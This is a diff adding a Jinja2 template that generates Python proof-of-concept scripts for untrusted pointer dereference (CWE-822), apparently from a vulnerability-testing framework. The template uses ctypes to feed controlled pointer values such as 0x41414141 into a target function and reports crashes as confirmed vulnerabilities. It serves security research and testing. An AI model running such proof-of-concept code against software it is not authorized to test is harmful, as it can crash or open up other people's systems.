@@ -1,0 +1,79 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Untrusted pointer dereference (CWE-822){% endblock %}
+
+{% block config %}
+# Controlled pointer values to test
+CONTROLLED_PTRS = [
+    0x0,                      # NULL
+    0x41414141,               # Low address (32-bit pattern)
+    0x4141414141414141,       # Pattern (64-bit)
+    0xFFFFFFFFFFFFFFFF,       # -1 / Invalid
+    0x7FFFFFFF,               # Max signed 32-bit
+]
+{% endblock %}
+
+{% block payload %}
+# Structure with controlled pointer value
+payload = struct.pack('<Q', 0x4141414141414141)  # Fake pointer
+{% endblock %}
+
+{% block exploit_doc %}Trigger untrusted pointer dereference{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Vulnerability: Untrusted Pointer Dereference")
+        print(f"[*] Sink: {{ sink_api }}")
+        print(f"[*] The function reads a pointer from user-controlled input")
+        print(f"[*] and dereferences it without validation")
+        print("")
+
+        # Allocate controlled memory that mimics user input structure
+        msvcrt = ctypes.CDLL("msvcrt")
+        malloc = msvcrt.malloc
+        malloc.restype = ctypes.c_void_p
+        malloc.argtypes = [ctypes.c_size_t]
+        free = msvcrt.free
+        free.argtypes = [ctypes.c_void_p]
+
+        # Test with different controlled pointer values
+        for i, ptr_val in enumerate(CONTROLLED_PTRS):
+            print(f"[*] Test {i+1}: Controlled pointer = 0x{ptr_val:x}")
+
+            # Create a buffer that the function will read from
+            # The buffer contains our controlled "pointer" value
+            buf_size = 256
+            buf = malloc(buf_size)
+            if not buf:
+                print("[!] Allocation failed")
+                continue
+
+            # Write controlled pointer value into the buffer
+            # This simulates user-controlled input containing a pointer
+            try:
+                ptr_bytes = struct.pack('<Q', ptr_val)
+                ctypes.memmove(buf, ptr_bytes, len(ptr_bytes))
+
+                # Call the vulnerable function
+                try:
+{% if arg_count and arg_count > 0 %}
+                    result = func({{ call_args | replace('payload_ptr', 'buf') | replace('payload_size', 'buf_size') }})
+{% else %}
+                    result = func(buf)
+{% endif %}
+                    print(f"    [+] Returned: {result}")
+                except OSError as e:
+                    print(f"    [!] Crash: {e}")
+                    if "0x" in str(e).lower():
+                        # Extract crash address
+                        print(f"    [+] Pointer dereference vulnerability confirmed!")
+                except Exception as e:
+                    print(f"    [*] Exception: {type(e).__name__}: {e}")
+
+            finally:
+                free(ctypes.c_void_p(buf))
+
+            print("")
+
+        print("[*] Untrusted pointer dereference test completed")
+        print("[*] If crashes occurred at controlled addresses, vulnerability is confirmed")
+{% endblock %}
